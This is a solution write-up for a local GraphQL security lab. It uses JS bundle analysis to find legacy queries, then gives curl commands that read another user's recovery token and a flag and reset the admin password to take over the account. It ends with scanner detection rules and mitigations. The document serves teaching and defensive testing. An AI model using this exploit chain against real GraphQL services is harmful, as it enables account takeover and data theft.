# graphql-lab — Solution

> **Goal:** test JS source code analysis where there are **no hardcoded
> secrets** in the bundle, but JS analysis still meaningfully helps the attacker.
> The bug is server-side; the JS just maps the attack surface.

## Lab summary

"NebulaCMS" — a small editorial platform with a GraphQL API at
`http://localhost:8094/graphql`. Introspection is **disabled** on the server,
so an attacker can't use the usual GraphQL discovery flow (`__schema`).

The JS bundle reveals operations the current web UI doesn't actually use —
"legacy queries" kept around for v1 mobile compatibility. Those legacy
operations point at fields and resolvers with broken field-level
authorisation on the backend.

---

## Findings

| # | Where | Finding |
|---|---|---|
| F1 | `/js/api.js` | `LEGACY_Q_USER_PROFILE` — query for `user(id:)` selecting `recoveryToken` and `internalNotes` fields. Web UI never calls this. |
| F2 | `/js/api.js` | `LEGACY_M_PASSWORD_RESET` — `resetPassword(token, newPassword)` mutation, also not called by current UI |
| F3 | Backend `/graphql` | `Query.user(id:)` requires login but has **no per-field authorisation** — any authenticated user reads any other user's `recoveryToken`, `internalNotes` |
| F4 | Backend `/graphql` | `Mutation.resetPassword` accepts any valid `recoveryToken` regardless of who's authenticated — combined with F3 = full account takeover |
| F5 | Backend `/graphql` | Introspection disabled. Forces field discovery via JS analysis. |

---

## Step 1 — Recon

```bash
# Front door
curl http://localhost:8094/
# GraphQL endpoint reachable
curl -X POST http://localhost:8094/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __typename }"}'
```

Try introspection — it's blocked:
```bash
curl -X POST http://localhost:8094/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'
# -> "GraphQL introspection is not allowed by Apollo Server..."
```

You can't introspect. **JS analysis is required.**

---

## Step 2 — JS source analysis

Spider the JS files:
```bash
curl http://localhost:8094/js/api.js
```

The file declares two sets of operations:

- **Active** (used by current UI): `Q_ME`, `Q_MY_ARTICLES`, `M_LOGIN`, `M_REGISTER`
- **Legacy** (NOT used anywhere in the UI): `LEGACY_Q_RECOVERY_INFO`,
  `LEGACY_Q_USER_PROFILE`, `LEGACY_M_PASSWORD_RESET`

The legacy queries reveal:

- A `user(id: ID!)` resolver exists (the web UI only uses `me`)
- That resolver returns fields not used in the UI: `recoveryToken`,
  `recoveryExpires`, `internalNotes`
- A `resetPassword(token, newPassword): Boolean` mutation exists

These are clues. They don't *prove* a bug — the developer may have intended
proper authz on these fields and just left the schema entries for mobile
compat. But they tell you exactly where to test.

---

## Step 3 — Register and login as a normal user

```bash
curl -X POST http://localhost:8094/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { register(username:\"attacker\", email:\"a@x.io\", password:\"a-pw\") { token } }"}'

TOKEN=<token from response>
```

`role` is set to `author` on the server side (mass-assignment is properly
prevented).

---

## Step 4 — Test field-level authz on `user(id:)`

The legacy query from F1 — but for someone else (`id: "1"` is admin):

```graphql
query LegacyUserProfile($id: ID!) {
  user(id: $id) {
    id
    username
    role
    recoveryToken
    internalNotes
  }
}
```

```bash
curl -X POST http://localhost:8094/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"query($id:ID!){user(id:$id){id username role recoveryToken internalNotes}}","variables":{"id":"1"}}'
```

Response:
```json
{
  "data": {
    "user": {
      "id": "1",
      "username": "admin",
      "role": "admin",
      "recoveryToken": "a7133f715d703229d57ee3245f853455",
      "internalNotes": "ROOT EDITORIAL — flag: FLAG{graphql_field_level_authz_bypass_recovery_token}"
    }
  }
}
```

**🏁 The flag is already here** — `internalNotes` should be admin-only but is
returned to any authenticated user.

---

## Step 5 — Bonus: full account takeover

The `recoveryToken` from Step 4 unlocks the password reset path (F2 + F4):

```bash
curl -X POST http://localhost:8094/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"mutation { resetPassword(token: \"a7133f715d703229d57ee3245f853455\", newPassword: \"pwned\") }"}'
# -> { "data": { "resetPassword": true } }

# Now login as admin
curl -X POST http://localhost:8094/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { login(username:\"admin\", password:\"pwned\") { token user { role } } }"}'
```

Real-world impact: complete editorial platform takeover, not just data leak.

---

## What the JS source scanner should flag

| Hint | Severity | Detection logic |
|---|---|---|
| GraphQL operations declared but never called from any UI code | High | Find `const X_FOO = \`query/mutation ...\`` declarations; cross-reference with call sites |
| Field names that appear in legacy queries but not in active queries | Medium | Build the set of fields fetched by active queries vs declared in any query |
| GraphQL operations naming "legacy", "v1", "deprecated", "internal" | Info | Substring match on identifiers and comments |
| Hardcoded GraphQL endpoint paths | Info | String literal matching `/graphql`, regex on query/mutation declarations |

A scanner that just looks for hardcoded secrets in JS won't find anything
here — that's the point of this lab.

---

## Mitigations

| Issue | Fix |
|---|---|
| F1/F2 | If a query/mutation isn't used by ANY current client, remove it. Don't leave it "for backwards compat" without an active client. |
| F3 | Enforce field-level authorisation in GraphQL resolvers. Fields like `recoveryToken`, `internalNotes` must resolve to `null` (or throw) when `ctx.user.id !== parent.id` and `ctx.user.role !== 'admin'`. |
| F4 | `resetPassword` should require either the user already authenticated AND being the owner, or a fresh email-delivered token tied to the specific request (not a stored field readable via GraphQL). |
| F5 | Keep introspection disabled in production — but understand it doesn't actually protect you. Treat the schema as public knowledge and enforce authz per-field. |
